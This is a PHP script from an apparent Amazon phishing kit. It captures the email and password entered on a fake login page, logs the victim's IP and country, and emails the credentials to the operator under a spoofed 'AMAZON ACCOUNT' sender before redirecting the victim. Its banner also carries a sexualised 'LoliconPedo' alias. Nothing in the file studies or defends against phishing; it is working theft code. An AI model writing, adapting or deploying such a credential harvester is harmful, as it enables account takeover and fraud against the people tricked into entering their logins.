<?php


session_start();
$randomnumber = rand(1, 100);

require_once('../__CONFIG__.php');
require_once('../detect.php');
include '../Library/ClassFunction/curldataip.php';

	$_SESSION['email'] = $_POST['email'];
	$_SESSION['password'] = $_POST['password'];

	$message =
		"[+] ========. [ Amazon Login - Powered By LoliconPedo️ ] .======= [+]

----------------Account Amazon--------------------
Account    : " . $_SESSION['email'] . "
Password   : " . $_SESSION['password'] . "
--------------------PC Info-----------------------
IP         : " . $ip . " | " . $nama_negara . "
Browser    : " . $_SERVER['HTTP_USER_AGENT'] . "
[+] ========. [ ❤️ Time is Money ❤️ ] .====== [+]
";
	$file2 = "../log/login.txt";
	$isi  = file_put_contents($file2, FILE_APPEND);
	$buka = fopen($file2, "w");
	fwrite($buka, $isi + 1);
	fclose($buka);
	$filev = fopen('../log/inputlogin.txt', "a");
    $time = date('H:i dS F');
    fwrite ($filev, " IP $showIP Dari $showCountry Menginput Login\r\n ");
    fclose( $filev );
	$headers = "From: ❤ AMAZON ACCOUNT ❤  <amazon4-$randomnumber@freakzbrothers.team>";
	$subject = "Login: " . $_SESSION['EM'] . " - " . $ip . " - " . $nama_negara . " - " . $countryname . " - " . $contin_name . "";
	mail($to, $subject, $message, $headers);
	header('Location: ../warning?udm_cat_path=' . sha1(time()));
